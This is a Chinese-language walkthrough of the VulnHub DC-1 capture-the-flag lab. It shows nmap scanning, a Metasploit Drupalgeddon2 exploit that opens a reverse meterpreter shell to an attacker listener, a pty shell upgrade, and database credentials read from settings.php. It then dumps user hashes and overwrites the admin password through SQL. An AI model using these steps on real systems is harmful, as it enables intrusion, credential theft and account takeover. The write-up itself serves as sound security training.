<center>DC-1</center>





[toc]









## DC-1

> vulnhub： [dc-1](https://www.vulnhub.com/entry/dc-1,292/)









### 1. 信息收集

```shell
# 扫描同网段
nmap -sP 172.16.168.128/24


# 扫描主机端口
nmap -p-  172.16.168.134 -A
```

```shell
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41405/tcp   status
|   100024  1          42665/udp6  status
|   100024  1          43205/tcp6  status
|_  100024  1          49197/udp   status
41405/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:64:49:E3 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
```

> `172.16.168.134`  `22`  `80` `111` `41405`
>
> 80端口：`Drupal 7`





### 2. msf

```shell
# 启动msf
msfconsole

# 搜索
search drupal

# 利用
use exploit/unix/webapp/drupal_drupalgeddon2

# 查看需要设置的参数 yes 必须设置的
show options
```

```shell
Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.16.168.128   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

```shell
# 设置RHOST
set rhost 172.16.168.134

# 运行
run / exploit
```

> 获取到`meterpreter`

```shell
# 进入shell
shell

# 获取交互shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

> `flag1`: 

```shell
cat flag1.txt
Every good CMS needs a config file - and so do you.
```

> 提示我们查看CMS的配置文件：

```shell
cd sites/default/

cat settings.php
```

```php
<?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 * 旗杆2
 * 暴力和字典攻击不是
 * 获得访问权限的唯一方法（您将需要访问权限）。
 * 你能用这些证书做什么？
 */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

> 获取到数据库信息。和`flag2`



```shell
# 连接数据库
mysql -udbuser -pR0ck3t

# 一些数据库常用命令
show databases;
use drupaldb;
show tables;

# 用户表
select * from users;

# 信息
1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR 
2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg
```

> 密码比较复杂，找`加密的文件`

```shell
# 进入目录
cd scripts

# 加密文件
cat password-hash.sh

# 加密shell，加密一个简单的数据，修改root密码
./password-hash.sh "123456"

# 有一个小bug
/password.inc): failed to open stream: No such file or directory in /var/www/scripts/password-hash.sh on line 83
# 修复 includes目录在上一层目录
cp -r ../includes .


password: 123456               hash: $S$DLmWVOVsHKsJYjRzELx3zOIh9LY6p2Dlwn60c36YUprmNFIKyQoG

# 进入数据库，修改密码
update users set pass='$S$DLmWVOVsHKsJYjRzELx3zOIh9LY6p2Dlwn60c36YUprmNFIKyQoG' where name='admin';
```

> `admin 123456` 登陆后台账号密码。

> 页面存在`flag3`

```shell
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
特殊的PERMS将帮助查找密码，但您需要执行该命令来计算如何获取阴影中的内容。
```

